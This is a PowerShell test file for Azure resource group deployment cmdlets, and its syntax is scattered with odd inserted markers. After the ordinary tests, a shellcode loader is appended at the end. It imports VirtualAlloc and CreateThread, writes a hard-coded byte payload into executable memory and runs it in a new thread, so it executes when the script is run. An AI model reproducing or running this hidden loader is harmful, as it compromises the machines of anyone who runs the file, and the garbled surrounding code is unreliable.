














 -||-> function Test-ValidateDeployment
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $location = "West US 2" <-||- 

	
	 -||-> New-AzResourceGroup -Name $rgname -Location $location <-||- 

	 -||-> $list =  -||-> Test-AzResourceGroupDeployment -ResourceGroupName $rgname -TemplateFile Build2014_Website_App.json -siteName $rname -hostingPlanName $rname -siteLocation $location -sku Free -workerSize 0 <-||-  <-||- 

	
	 -||-> Assert-AreEqual 0 @( -||-> $list <-||- ).Count <-||- 
} <-||- 


 -||-> function Test-NewDeploymentFromTemplateFile
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $rglocation = "West US 2" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||- 

		 -||-> $deployment =  -||-> New-AzResourceGroupDeployment -Name $rname -ResourceGroupName $rgname -TemplateFile sampleDeploymentTemplate.json -TemplateParameterFile sampleDeploymentTemplateParams.json <-||-  <-||- 

		
		 -||-> Assert-AreEqual Succeeded $deployment.ProvisioningState <-||- 

		 -||-> $subId = ( -||-> Get-AzContext <-||- ).Subscription.SubscriptionId <-||- 
		 -||-> $deploymentId = "/subscriptions/$subId/resourcegroups/$rgname/providers/Microsoft.Resources/deployments/$rname" <-||- 
		 -||-> $getById =  -||-> Get-AzResourceGroupDeployment -Id $deploymentId <-||-  <-||- 
		 -||-> Assert-AreEqual $getById.DeploymentName $deployment.DeploymentName <-||- 
	}

	finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 

 -||-> function Test-NewDeploymentFromTemplateObject
{
    
     -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
     -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $rglocation = "West US 2" <-||- 

     -||-> try
    {
        
         -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||- 

         -||-> $path = ( -||-> Get-Item ".\" <-||- ).FullName <-||- 
         -||-> $file =  -||-> Join-Path $path "sampleDeploymentTemplate.json" <-||-  <-||- 
         -||-> $json =  -||-> ConvertFrom-Json ( -||-> [System.IO.File]::ReadAllText($file) <-||- ) <-||-  <-||- 
         -||-> $templateObject = @{} <-||- 
         -||-> $json.PSObject.Properties | % {  -||-> $templateObject[$_.Name] = $_.Value <-||-  } <-||- 
         -||-> $deployment =  -||-> New-AzResourceGroupDeployment -Name $rname -ResourceGroupName $rgname -TemplateObject $templateObject -TemplateParameterFile sampleDeploymentTemplateParams.json <-||-  <-||- 

        
         -||-> Assert-AreEqual Succeeded $deployment.ProvisioningState <-||- 

		 -||-> $subId = ( -||-> Get-AzContext <-||- ).Subscription.SubscriptionId <-||- 
		 -||-> $deploymentId = "/subscriptions/$subId/resourcegroups/$rgname/providers/Microsoft.Resources/deployments/$rname" <-||- 
		 -||-> $getById =  -||-> Get-AzResourceGroupDeployment -Id $deploymentId <-||-  <-||- 
		 -||-> Assert-AreEqual $getById.DeploymentName $deployment.DeploymentName <-||- 
	}

	finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 

 -||-> function Test-TestResourceGroupDeploymentErrors
{
    
     -||-> $rgname = "unknownresourcegroup" <-||- 
     -||-> $deploymentName =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $result =  -||-> Test-AzResourceGroupDeploymentWithName -DeploymentName $deploymentName -ResourceGroupName $rgname -TemplateFile sampleDeploymentTemplate.json -TemplateParameterFile sampleDeploymentTemplateParams.json <-||-  <-||- 
     -||-> Write-Debug "$result" <-||- 
     -||-> Assert-NotNull $result <-||- 
     -||-> Assert-AreEqual "ResourceGroupNotFound" $result.Code <-||- 
     -||-> Assert-AreEqual "Resource group '$rgname' could not be found." $result.Message <-||- 

    
     -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
     -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $rglocation = "West US 2" <-||- 

     -||-> try
    {
        
        
         -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||- 
         -||-> $result =  -||-> Test-AzResourceGroupDeploymentWithName -DeploymentName $deploymentName -ResourceGroupName $rgname -TemplateFile sampleDeploymentTemplate.json -SkipTemplateParameterPrompt <-||-  <-||- 
         -||-> Assert-NotNull $result <-||- 
         -||-> Assert-AreEqual "InvalidTemplate" $result.Code <-||- 
         -||-> Assert-StartsWith "Deployment template validation failed" $result.Message <-||- 
    }
    finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-CrossResourceGroupDeploymentFromTemplateFile
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $rgname2 =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $rglocation = "West US 2" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||- 
		 -||-> New-AzResourceGroup -Name $rgname2 -Location $rglocation <-||- 

		 -||-> $parameters = @{ "NestedDeploymentResourceGroup" =  -||-> $rgname2 <-||-  } <-||- 
		 -||-> $deployment =  -||-> New-AzResourceGroupDeployment -Name $rname -ResourceGroupName $rgname -TemplateFile sampleTemplateWithCrossResourceGroupDeployment.json -TemplateParameterObject $parameters <-||-  <-||- 

		
		 -||-> Assert-AreEqual Succeeded $deployment.ProvisioningState <-||- 

		 -||-> $subId = ( -||-> Get-AzContext <-||- ).Subscription.SubscriptionId <-||- 
		 -||-> $deploymentId = "/subscriptions/$subId/resourcegroups/$rgname/providers/Microsoft.Resources/deployments/$rname" <-||- 
		 -||-> $getById =  -||-> Get-AzResourceGroupDeployment -Id $deploymentId <-||-  <-||- 
		 -||-> Assert-AreEqual $getById.DeploymentName $deployment.DeploymentName <-||- 

		 -||-> $nestedDeploymentId = "/subscriptions/$subId/resourcegroups/$rgname2/providers/Microsoft.Resources/deployments/nestedTemplate" <-||- 
		 -||-> $nestedDeployment =  -||-> Get-AzResourceGroupDeployment -Id $nestedDeploymentId <-||-  <-||- 
		 -||-> Assert-AreEqual Succeeded $nestedDeployment.ProvisioningState <-||- 
	}

	finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-NestedErrorsDisplayed
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $rglocation = "CentralUSEUAP" <-||- 

	 -||-> try
	{
		
		 -||-> $ErrorActionPreference = "SilentlyContinue" <-||- 
		 -||-> $Error.Clear() <-||- 
		 -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||- 
		 -||-> New-AzResourceGroupDeployment -Name $rname -ResourceGroupName $rgname -TemplateFile sampleTemplateThrowsNestedErrors.json <-||- 
	}
	catch
	{
		 -||-> Assert-True {  -||-> $Error[1].Contains("Storage account name must be between 3 and 24 characters in length") <-||-  } <-||- 
	}
	finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-NestedDeploymentFromTemplateFile
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $rglocation = "West US 2" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||- 

		 -||-> $deployment =  -||-> New-AzResourceGroupDeployment -Name $rname -ResourceGroupName $rgname -TemplateFile sampleNestedTemplate.json -TemplateParameterFile sampleNestedTemplateParams.json <-||-  <-||- 

		
		 -||-> Assert-AreEqual Succeeded $deployment.ProvisioningState <-||- 

		 -||-> $subId = ( -||-> Get-AzContext <-||- ).Subscription.SubscriptionId <-||- 
		 -||-> $deploymentId = "/subscriptions/$subId/resourcegroups/$rgname/providers/Microsoft.Resources/deployments/$rname" <-||- 
		 -||-> $getById =  -||-> Get-AzResourceGroupDeployment -Id $deploymentId <-||-  <-||- 
		 -||-> Assert-AreEqual $getById.DeploymentName $deployment.DeploymentName <-||- 
	}

	finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-SaveDeploymentTemplateFile
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $rglocation = "West US 2" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||- 

		 -||-> $deployment =  -||-> New-AzResourceGroupDeployment -Name $rname -ResourceGroupName $rgname -TemplateFile sampleDeploymentTemplate.json -TemplateParameterFile sampleDeploymentTemplateParams.json <-||-  <-||- 

		
		 -||-> Assert-AreEqual Succeeded $deployment.ProvisioningState <-||- 

		 -||-> $saveOutput =  -||-> Save-AzResourceGroupDeploymentTemplate -ResourceGroupName $rgname -DeploymentName $rname -Force <-||-  <-||- 
		 -||-> Assert-NotNull $saveOutput <-||- 
		 -||-> Assert-True {  -||-> $saveOutput.Path.Contains($rname + ".json") <-||-  } <-||- 
	}

	finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-NewDeploymentWithKeyVaultReference
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $keyVaultname =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $secretName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $rglocation = "CentralUSEUAP" <-||- 
	 -||-> $location =  -||-> Get-ProviderLocation "Microsoft.Web/sites" <-||-  <-||- 
	 -||-> $hostplanName = "xDeploymentTestHost26668" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||- 

		 -||-> $context =  -||-> Get-AzContext <-||-  <-||- 
		 -||-> $subscriptionId = $context.Subscription.SubscriptionId <-||- 
		 -||-> $tenantId = $context.Tenant.TenantId <-||- 
		 -||-> $adUser =  -||-> Get-AzADUser -UserPrincipalName $context.Account.Id <-||-  <-||- 
		 -||-> $objectId = $adUser.Id <-||- 
		 -||-> $KeyVaultResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $rgname + "/providers/Microsoft.KeyVault/vaults/" + $keyVaultname <-||- 

		 -||-> $parameters = @{ "keyVaultName" =  -||-> $keyVaultname <-||- ; "secretName" =  -||-> $secretName <-||- ; "secretValue" =  -||-> $hostplanName <-||- ; "tenantId" =  -||-> $tenantId <-||- ; "objectId" =  -||-> $objectId <-||-  } <-||- 
		 -||-> $deployment =  -||-> New-AzResourceGroupDeployment -Name $rname -ResourceGroupName $rgname -TemplateFile keyVaultSetupTemplate.json -TemplateParameterObject $parameters <-||-  <-||- 

		
		 -||-> Assert-AreEqual Succeeded $deployment.ProvisioningState <-||- 

		 -||-> $content =  -||-> ( -||-> Get-Content keyVaultTemplateParams.json <-||- ) -join '' | ConvertFrom-Json <-||-  <-||- 
		 -||-> $content.hostingPlanName.reference.KeyVault.id = $KeyVaultResourceId <-||- 
		 -||-> $content.hostingPlanName.reference.SecretName = $secretName <-||- 
		 -||-> $content | ConvertTo-Json -depth 999 | Out-File keyVaultTemplateParams.json <-||- 

		 -||-> $deployment =  -||-> New-AzResourceGroupDeployment -Name $rname -ResourceGroupName $rgname -TemplateFile sampleTemplate.json -TemplateParameterFile keyVaultTemplateParams.json <-||-  <-||- 

		
		 -||-> Assert-AreEqual Succeeded $deployment.ProvisioningState <-||- 

		 -||-> $subId = ( -||-> Get-AzContext <-||- ).Subscription.SubscriptionId <-||- 
		 -||-> $deploymentId = "/subscriptions/$subId/resourcegroups/$rgname/providers/Microsoft.Resources/deployments/$rname" <-||- 
		 -||-> $getById =  -||-> Get-AzResourceGroupDeployment -Id $deploymentId <-||-  <-||- 
		 -||-> Assert-AreEqual $getById.DeploymentName $deployment.DeploymentName <-||- 
	}

	finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-NewDeploymentWithComplexPramaters
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $rglocation = "CentralUSEUAP" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||- 

		 -||-> $deployment =  -||-> New-AzResourceGroupDeployment -Name $rname -ResourceGroupName $rgname -TemplateFile complexParametersTemplate.json -TemplateParameterFile complexParameters.json <-||-  <-||- 

		
		 -||-> Assert-AreEqual Succeeded $deployment.ProvisioningState <-||- 

		 -||-> $subId = ( -||-> Get-AzContext <-||- ).Subscription.SubscriptionId <-||- 
		 -||-> $deploymentId = "/subscriptions/$subId/resourcegroups/$rgname/providers/Microsoft.Resources/deployments/$rname" <-||- 
		 -||-> $getById =  -||-> Get-AzResourceGroupDeployment -Id $deploymentId <-||-  <-||- 
		 -||-> Assert-AreEqual $getById.DeploymentName $deployment.DeploymentName <-||- 
	}

	finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-NewDeploymentWithParameterObject
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $rglocation = "CentralUSEUAP" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||- 

		 -||-> $deployment =  -||-> New-AzResourceGroupDeployment -Name $rname -ResourceGroupName $rgname -TemplateFile complexParametersTemplate.json -TemplateParameterObject @{appSku= -||-> @{code= -||-> "f1" <-||- ; name= -||-> "Free" <-||- } <-||- ; servicePlan= -||-> "plan1" <-||- ; ranks= -||-> @( -||-> "c", "d" <-||- ) <-||- } <-||-  <-||- 

		
		 -||-> Assert-AreEqual Succeeded $deployment.ProvisioningState <-||- 

		 -||-> $subId = ( -||-> Get-AzContext <-||- ).Subscription.SubscriptionId <-||- 
		 -||-> $deploymentId = "/subscriptions/$subId/resourcegroups/$rgname/providers/Microsoft.Resources/deployments/$rname" <-||- 
		 -||-> $getById =  -||-> Get-AzResourceGroupDeployment -Id $deploymentId <-||-  <-||- 
		 -||-> Assert-AreEqual $getById.DeploymentName $deployment.DeploymentName <-||- 
	}

	finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-NewDeploymentWithDynamicParameters
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $rglocation = "West US 2" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||- 

		 -||-> $deployment =  -||-> New-AzResourceGroupDeployment -Name $rname -ResourceGroupName $rgname -TemplateFile complexParametersTemplate.json -appSku @{code= -||-> "f3" <-||- ; name= -||-> @{major= -||-> "Official" <-||- ; minor= -||-> "1.0" <-||- } <-||- } -servicePlan "plan1" -ranks @( -||-> "c", "d" <-||- ) <-||-  <-||- 

		
		 -||-> Assert-AreEqual Succeeded $deployment.ProvisioningState <-||- 

		 -||-> $subId = ( -||-> Get-AzContext <-||- ).Subscription.SubscriptionId <-||- 
		 -||-> $deploymentId = "/subscriptions/$subId/resourcegroups/$rgname/providers/Microsoft.Resources/deployments/$rname" <-||- 
		 -||-> $getById =  -||-> Get-AzResourceGroupDeployment -Id $deploymentId <-||-  <-||- 
		 -||-> Assert-AreEqual $getById.DeploymentName $deployment.DeploymentName <-||- 
	}

	finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-NewDeploymentWithInvalidParameters
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $rglocation = "CentralUSEUAP" <-||- 

	 -||-> try
	{
		
		 -||-> $ErrorActionPreference = "SilentlyContinue" <-||- 
		 -||-> $Error.Clear() <-||- 
		 -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||- 
		 -||-> $deployment =  -||-> New-AzResourceGroupDeployment -Name $rname -ResourceGroupName $rgname -TemplateFile complexParametersTemplate.json -appSku @{code= -||-> "f4" <-||- ; name= -||-> "Free" <-||- } -servicePlan "plan1" <-||-  <-||- 
	}
	catch
	{
		 -||-> Assert-True {  -||-> $Error[1].Contains("The parameter value is not part of the allowed value(s)") <-||-  } <-||- 
	}
	finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-NewDeploymentWithKeyVaultReferenceInParameterObject
{
	
	 -||-> $location = "West US" <-||- 

	 -||-> $vaultId = "/subscriptions/fb3a3d6b-44c8-44f5-88c9-b20917c9b96b/resourceGroups/powershelltest-keyvaultrg/providers/Microsoft.KeyVault/vaults/saname" <-||- 
	 -||-> $secretName = "examplesecret" <-||- 

	 -||-> try
	{
		 -||-> $deploymentRG =  -||-> Get-ResourceGroupName <-||-  <-||- 
		 -||-> $deploymentName =  -||-> Get-ResourceName <-||-  <-||- 

		 -||-> New-AzResourceGroup -Name $deploymentRG -Location $location <-||- 

		
		 -||-> $parameters = @{"storageAccountName"=  -||-> @{"reference"=  -||-> @{"keyVault"=  -||-> @{"id"=  -||-> $vaultId <-||- } <-||- ;"secretName"=  -||-> $secretName <-||- } <-||- } <-||- } <-||- 
		 -||-> $deployment =  -||-> New-AzResourceGroupDeployment -Name $deploymentName -ResourceGroupName $deploymentRG -TemplateFile StorageAccountTemplate.json -TemplateParameterObject $parameters <-||-  <-||- 

		
		 -||-> Assert-AreEqual Succeeded $deployment.ProvisioningState <-||- 
	}

	finally
    {
        
         -||-> Clean-ResourceGroup $deploymentRG <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-NewDeploymentFromNonexistentTemplateFile
{
    
     -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
     -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $rglocation = "West US 2" <-||- 
     -||-> try
    {
        
         -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||- 

        
         -||-> $path = ( -||-> Get-Item ".\" <-||- ).FullName <-||- 
         -||-> $file =  -||-> Join-Path $path "nonexistentFile.json" <-||-  <-||- 
         -||-> $exceptionMessage = "Cannot retrieve the dynamic parameters for the cmdlet. Cannot find path '$file' because it does not exist." <-||- 
         -||-> Assert-Throws {  -||-> New-AzResourceGroupDeployment -Name $rname -ResourceGroupName $rgname -TemplateFile $file -TemplateParameterFile sampleTemplateParams.json <-||-  } $exceptionMessage <-||- 
    }
    finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-NewDeploymentFromNonexistentTemplateParameterFile
{
    
     -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
     -||-> $rname =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $rglocation = "West US 2" <-||- 
     -||-> try
    {
        
         -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||- 

        
         -||-> $path = ( -||-> Get-Item ".\" <-||- ).FullName <-||- 
         -||-> $file =  -||-> Join-Path $path "nonexistentFile.json" <-||-  <-||- 
         -||-> $exceptionMessage = "Cannot retrieve the dynamic parameters for the cmdlet. Cannot find path '$file' because it does not exist." <-||- 
         -||-> Assert-Throws {  -||-> New-AzResourceGroupDeployment -Name $rname -ResourceGroupName $rgname -TemplateFile sampleTemplateParams.json -TemplateParameterFile $file <-||-  } $exceptionMessage <-||- 
    }
    finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 
 -||-> $SYj = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $SYj -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xc5,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xbe,0x99,0x74,0x7c,0x4f,0xb1,0x53,0x31,0x70,0x17,0x83,0xc0,0x04,0x03,0xe9,0x67,0x9e,0xba,0xf5,0x60,0xdc,0x45,0x05,0x71,0x81,0xcc,0xe0,0x40,0x81,0xab,0x61,0xf2,0x31,0xbf,0x27,0xff,0xba,0xed,0xd3,0x74,0xce,0x39,0xd4,0x3d,0x65,0x1c,0xdb,0xbe,0xd6,0x5c,0x7a,0x3d,0x25,0xb1,0x5c,0x7c,0xe6,0xc4,0x9d,0xb9,0x1b,0x24,0xcf,0x12,0x57,0x9b,0xff,0x17,0x2d,0x20,0x74,0x6b,0xa3,0x20,0x69,0x3c,0xc2,0x01,0x3c,0x36,0x9d,0x81,0xbf,0x9b,0x95,0x8b,0xa7,0xf8,0x90,0x42,0x5c,0xca,0x6f,0x55,0xb4,0x02,0x8f,0xfa,0xf9,0xaa,0x62,0x02,0x3e,0x0c,0x9d,0x71,0x36,0x6e,0x20,0x82,0x8d,0x0c,0xfe,0x07,0x15,0xb6,0x75,0xbf,0xf1,0x46,0x59,0x26,0x72,0x44,0x16,0x2c,0xdc,0x49,0xa9,0xe1,0x57,0x75,0x22,0x04,0xb7,0xff,0x70,0x23,0x13,0x5b,0x22,0x4a,0x02,0x01,0x85,0x73,0x54,0xea,0x7a,0xd6,0x1f,0x07,0x6e,0x6b,0x42,0x40,0x43,0x46,0x7c,0x90,0xcb,0xd1,0x0f,0xa2,0x54,0x4a,0x87,0x8e,0x1d,0x54,0x50,0xf0,0x37,0x20,0xce,0x0f,0xb8,0x51,0xc7,0xcb,0xec,0x01,0x7f,0xfd,0x8c,0xc9,0x7f,0x02,0x59,0x67,0x77,0xa5,0x32,0x9a,0x7a,0x15,0xe3,0x1a,0xd4,0xfe,0xe9,0x94,0x0b,0x1e,0x12,0x7f,0x24,0xb7,0xef,0x80,0x5b,0x14,0x79,0x66,0x31,0xb4,0x2f,0x30,0xad,0x76,0x14,0x89,0x4a,0x88,0x7e,0xa1,0xfc,0xc1,0x68,0x76,0x03,0xd2,0xbe,0xd0,0x93,0x59,0xad,0xe4,0x82,0x5d,0xf8,0x4c,0xd3,0xca,0x76,0x1d,0x96,0x6b,0x86,0x34,0x40,0x0f,0x15,0xd3,0x90,0x46,0x06,0x4c,0xc7,0x0f,0xf8,0x85,0x8d,0xbd,0xa3,0x3f,0xb3,0x3f,0x35,0x07,0x77,0xe4,0x86,0x86,0x76,0x69,0xb2,0xac,0x68,0xb7,0x3b,0xe9,0xdc,0x67,0x6a,0xa7,0x8a,0xc1,0xc4,0x09,0x64,0x98,0xbb,0xc3,0xe0,0x5d,0xf0,0xd3,0x76,0x62,0xdd,0xa5,0x96,0xd3,0x88,0xf3,0xa9,0xdc,0x5c,0xf4,0xd2,0x00,0xfd,0xfb,0x09,0x81,0x0d,0xb6,0x13,0xa0,0x85,0x1f,0xc6,0xf0,0xcb,0x9f,0x3d,0x36,0xf2,0x23,0xb7,0xc7,0x01,0x3b,0xb2,0xc2,0x4e,0xfb,0x2f,0xbf,0xdf,0x6e,0x4f,0x6c,0xdf,0xba <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $Q6IO=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $Q6IO.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$Q6IO,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



